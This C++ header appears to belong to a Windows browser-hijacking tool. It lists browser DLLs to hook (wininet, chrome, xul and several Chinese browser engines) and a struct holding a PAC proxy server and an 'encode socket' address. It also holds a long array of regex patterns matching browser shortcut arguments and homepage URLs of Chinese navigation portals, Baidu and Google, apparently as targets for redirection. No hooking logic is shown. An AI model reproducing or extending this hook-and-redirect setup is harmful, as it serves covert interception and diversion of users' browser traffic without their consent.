#pragma once
#include <WinSock2.h>
#include <tchar.h>

#include "CommonControl\Log.h"

#define MAX_IP4_STRING_LEN		16
#define MAX_IP6_STRING_LEN		46

#define MAX_IP_STRING_LEN		MAX_IP6_STRING_LEN

typedef struct _BUSINESS_DATA {
	USHORT usPACServerProt;
	CHAR szPACServerIP[MAX_IP_STRING_LEN + 1];
	USHORT usEncodeSockProt;
	CHAR szEncodeSockIP[MAX_IP_STRING_LEN + 1];
}BUSINESS_DATA, *PBUSINESS_DATA;

namespace Global {
	extern CDebug Log;

	extern sockaddr_in addrEncodeSocket;
	extern PBUSINESS_DATA pBusinessData;
}

static const TCHAR * pszSocketHookLists[] = {
	_T("wininet.dll"),												// webbrowser控件
	_T("chrome.dll") ,												// chrome/360安全/360极速/uc/2345/猎豹/qq 浏览器
	_T("webkitcore.dll") ,										// 搜狗
	_T("mxwebkit.dll"),											// 遨游云
	_T("xul.dll"),														// 遨游云
	_T("fastproxy.dll"), 											// 百度
	_T("chromecore.dll"),										// 百度
};

static  const char * pcreRedirectURLHitLists[] = {
	("\\\\liebao\\.exe\"? +--ico\\d(?: |$)"),
	("\\\\qqbrowser\\.exe\"? +-sc=[^ ]+shortcut(?: |$)"),
	("\\\\2345explorer\\.exe\"? +--shortcut=[^ ]+(?: |$)"),

	("(?: |http[s]?://)hao\\.360\\.cn/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

	("(?: |http[s]?://)www\\.duba\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

	("(?: |http[s]?://)123\\.sogou\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
	("(?: |http[s]?://)www\\.sogou\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

	("(?: |http[s]?://)www\\.2345\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

	("(?: |http[s]?://)0\\.baidu\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
	("(?: |http[s]?://)www\\.baidu\\.com/*(?:home[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
	("(?: |http[s]?://)www\\.baidu\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

	("(?: |http[s]?://)www\\.hao123\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
	("(?: |http[s]?://)[^.]*\\.hao123\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?tn=[^ ]*)?(?: |$)"),//https: cn.hao123.com/?tn=13087099_41_hao_pg

	("(?: |http[s]?://)www\\.google\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
	("(?: |http[s]?://)www\\.google\\.com\\.hk/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

	("(?: |http[s]?://)*\\.wbindex\\.cn/*.*$"),
	("(?: |http[s]?://)*\\.bmywm\\.com/*.*$"), // wtlcx77.bmywm.com/index.1.html

	("(?: |http[s]?://)*\\.58toto\\.com/*.*$"), // index.58toto.com/home?u=28378

	("(?: |http[s]?://)*\\.114la\\.com/*.*$"), // www.114la.com

	("\\.index66\\.com"),
	("pc918\\.net"),
	("interface\\.wx-media\\.com"),
	("index\\.icafevip\\.com"),
	("17dao\\.com"),
	("www\\.58fy\\.com"),
	("daohang\\.qq\\.com"),
	("www\\.wblove\\.com"),
	("www\\.v232\\.com"),
	("www\\.95browser\\.com"),
	("www\\.6461\\.cn"),
	("www\\.95soo\\.com"),
	("www\\.go890\\.com"),
	("www\\.wb12318\\.com"),
	("jl100\\.net"),
	("index\\.woai310\\.com"),
	("1234wu\\.com"),
	("123\\.org\\.cn"),
	("123\\.19so\\.cn"),
	("huo99\\.com"),
	("sogoulp\\.com"),
	("www\\.52wba\\.com"),
	("www\\.ld56\\.com"),
	("www\\.wb400\\.net"),
	("58aq\\.com"),
	("g-fox\\.cn"),
	("uc123\\.com"),
	("maxthon\\.cn"),
	("firefoxchina\\.cn"),
	("opera\\.com"),
	("so\\.360\\.cn"),
	("3600\\.com"),
	("12318wh\\.com"),
	("19so\\.cn"),
	("917wb\\.com"),
	("wbindex\\.cn"),
	("jj123\\.com\\.cn"),
	("woai310\\.com"),
	("i8cs\\.com"),
	("v228\\.cn"),
	("58ny\\.com"),
	("tao123\\.com"),
	("soso\\.com"),
	("ld56\\.com"),
	("16116\\.net"),
	("wz58\\.com"),
	("42\\.62\\.30\\.178"),
	("42\\.62\\.30\\.180"),
	("index\\.icafe66\\.com"),
	("127.0.0.1:"),
	("localhost:")

};
